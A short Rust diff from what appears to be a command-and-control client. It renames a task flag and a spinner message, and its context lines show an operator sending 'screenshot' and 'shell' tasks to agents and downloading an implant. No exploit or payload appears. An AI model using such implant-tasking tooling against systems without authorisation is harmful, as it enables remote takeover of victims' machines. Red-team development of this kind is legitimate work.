@@ -263,7 +263,7 @@ impl Client {
 
                                     message = Message::Text(format!("task {} screenshot", t_agent));
 
-                                    send_flag = "[task]".to_string();
+                                    send_flag = "[task:set]".to_string();
                                 } else {
                                     continue;
                                 }
@@ -275,7 +275,7 @@ impl Client {
 
                                     message = Message::Text(format!("task {} shell {}", t_agent, t_command));
 
-                                    send_flag = "[task]".to_string();
+                                    send_flag = "[task:set]".to_string();
                                 } else{
                                     continue;
                                 }
@@ -330,10 +330,10 @@ impl Client {
                         Spinners::Dots8,
                         "Downloaing the implant...".into()));
                 }
-                "[task]" => {
+                "[task:set]" => {
                     spin = Some(Spinner::new(
                         Spinners::Dots8,
-                        "Waiting for the task execution...".into()));
+                        "Waiting for the task result...".into()));
                 }
                 _ => {}
             }
